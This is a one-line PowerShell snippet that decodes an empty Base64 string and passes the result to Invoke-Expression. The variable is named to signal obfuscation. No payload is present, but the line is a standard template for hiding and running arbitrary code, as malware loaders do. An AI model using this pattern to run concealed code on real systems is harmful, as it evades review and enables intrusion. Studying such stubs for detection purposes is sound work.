$e = [System.Convert]::FromBase64String(''); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated